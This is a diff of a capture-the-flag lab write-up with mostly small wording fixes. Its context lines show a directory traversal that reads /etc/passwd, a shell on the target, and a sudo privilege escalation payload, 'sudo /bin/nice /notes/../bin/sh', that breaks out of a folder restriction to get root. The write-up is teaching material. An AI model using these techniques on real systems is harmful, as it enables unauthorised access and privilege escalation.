@@ -56,10 +56,10 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 ```
 
-> `admin` reveals a login page
+> `/admin` reveals a login page
 {: .prompt-info }
 
-### normal login request
+### testing default credentials
 #### request
 ```http
 POST /admin/index.php?login=1 HTTP/1.1
@@ -96,7 +96,7 @@ Content-Type: text/html; charset=UTF-8
 <p>Bad user/password! </br> Return to the <a href="index.php">login page</a> <p>
 ```
 
-> `admin:123456` and other standard combinations unfortunately do not work
+> `admin:123456` and other standard combinations unfortunately do not work.
 {: .prompt-danger }
 
 ---
@@ -227,7 +227,7 @@ Yay! It worked. We are now in the admin panel.
 
 ## arbitriary file read in `/admin/dashboard.php?page=log`
 
-The proof that there is a `directory traversal` vulnerability we read the `/etc/passwd` file.
+To proof that there is a `directory traversal` vulnerability we read the `/etc/passwd` file.
 
 ### request
 ```bash
@@ -346,6 +346,11 @@ individual files in /usr/share/doc/*/copyright.
 
 Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
 applicable law.
+webadmin@serv:~$
+```
+
+Get the first flag.
+```bash
 webadmin@serv:~$ ls
 local.txt  user.txt
 webadmin@serv:~$ cat local.txt 
@@ -376,7 +381,7 @@ To check how to exploit the program `nice` to get `root` access, we can have a l
 > Unfortunately we are jailed to the `/notes` folder
 {: .prompt-danger }
 
-> This restriction can be bypassed by traversing out of the `/notes` folder. So the finale payload to get `root` access looks like the following: `sudo /bin/nice /notes/../bin/sh`
+> This restriction can be bypassed by traversing out of the `/notes` folder. So the final payload to get `root` access looks like the following: `sudo /bin/nice /notes/../bin/sh`
 {: .prompt-tip }
 
 ```bash
